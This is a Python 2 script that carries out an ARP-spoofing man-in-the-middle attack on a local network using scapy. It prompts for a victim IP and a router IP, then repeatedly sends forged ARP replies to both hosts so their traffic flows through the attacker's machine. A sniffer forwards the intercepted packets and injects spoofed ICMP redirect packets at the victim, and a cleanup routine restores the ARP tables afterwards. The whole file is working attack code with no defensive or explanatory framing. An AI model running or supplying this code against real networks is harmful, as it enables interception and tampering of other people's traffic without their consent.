import subprocess
import os
import scapy.all
import time
import sys
import threading
import fcntl
import socket
import struct

attacker_ip='192.168.5.99'
victim_mac='54:27:1e:41:00:29'
my_ip=attacker_ip
router_mac='d8:b1:90:ed:90:40'
attacker_mac='34:36:3b:d3:76:72'
router_ip='192.168.5.254'
victim_ip='0'
ips=[]

def icmp_gen(x):
    print 'agtiorngrtnhiutroigtnriogninrtibniurtnnogrtonoirtngorotgnjrtnewpi'
    res=scapy.all.Ether(dst=victim_mac, src=attacker_mac)
    res=res/scapy.all.IP(version=4, ttl=64, proto=1, src=attacker_ip, dst=victim_ip)
    res=res/scapy.all.ICMP(type=5, code=1, gw=router_ip)
    res=res/x['IP']
    del res['IP'].chksum
    try:
        del res['TCP'].chksum
    except:
        pass
    try:
        del res['Raw']
    except:
        pass
    res.show2()
    return res


def select_victim():
    victim_ip=raw_input('Input victim IP')
    router_ip=raw_input('Input router IP')
    return (victim_ip, router_ip)

def getMac(host):
    a=subprocess.Popen(["arp", "-a"], stdout=subprocess.PIPE)
    a=a.stdout.read().split('\n')[:-1]
    for i in a:
        tmp=i.split(' ')
        if host in tmp[1]:
            return tmp[3]

def attack(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

def recover(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=3)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=3)

def pr(x):
    try:
        print victim_ip

        if(x['IP'].dst != my_ip):
            if (x['IP'].dst == victim_ip):
                scapy.all.sendp(icmp_gen(x))
            scapy.all.sendp(x, iface='en0')
    except Exception, err:
        print err
        pass

def sniffing():
    scapy.all.sniff(prn=pr)

def main():
    #if os.geteuid() != 0:
    #    sys.exit("[!] Please run as root")
    IP=select_victim()
    global victim_ip
    victim_ip=IP[0]
    router_ip=IP[1]

    if getMac(router_ip) == None:
        print 'We can not find router mac address'
        return

    if getMac(victim_ip) == None:
        print 'we can not find victim mac address'
        return

    t=threading.Thread(target=sniffing)
    t.start()


    try:
        while True:
            print 'a'
            attack(victim_ip, router_ip)
            time.sleep(2)
    except Exception, err:
        print err
        recover(victim_ip, router_ip)
        t.join(10)
        exit()



if __name__ == '__main__':
    with open('test.txt', 'rt') as f:
        ips=f.read().split(' ')
    main()